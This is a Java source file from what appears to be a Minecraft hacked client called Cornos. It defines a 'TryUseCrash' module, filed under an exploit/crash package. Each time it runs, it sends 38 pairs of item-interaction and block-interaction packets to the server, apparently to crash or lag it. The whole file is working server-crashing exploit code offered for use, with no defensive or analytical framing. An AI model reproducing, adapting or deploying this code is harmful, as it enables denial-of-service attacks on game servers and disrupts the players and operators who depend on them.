/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# Project: Cornos
# File: TryUseCrash
# Created by constantin at 07:31, MÃ¤r 18 2021
PLEASE READ THE COPYRIGHT NOTICE IN THE PROJECT ROOT, IF EXISTENT
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/
package me.zeroX150.cornos.features.module.impl.exploit.crash;

import me.zeroX150.cornos.Cornos;
import me.zeroX150.cornos.features.module.Module;
import me.zeroX150.cornos.features.module.ModuleType;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class TryUseCrash extends Module {
	public TryUseCrash() {
		super("TryUseCrash", "oh no the user interacted with something", ModuleType.CRASH);
	}

	@Override
	public void onExecute() {
		if (Cornos.minecraft.getNetworkHandler() == null)
			return;

		for (int i = 0; i < 38; i++) {
			assert Cornos.minecraft.player != null;
			BlockHitResult bhr = new BlockHitResult(new Vec3d(.5, .5, .5), Direction.DOWN,
					Cornos.minecraft.player.getBlockPos(), false);
			net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket p = new PlayerInteractItemC2SPacket(
					Hand.MAIN_HAND);
			PlayerInteractBlockC2SPacket p1 = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);
			Cornos.minecraft.getNetworkHandler().sendPacket(p);
			Cornos.minecraft.getNetworkHandler().sendPacket(p1);
		}
		super.onExecute();
	}
}
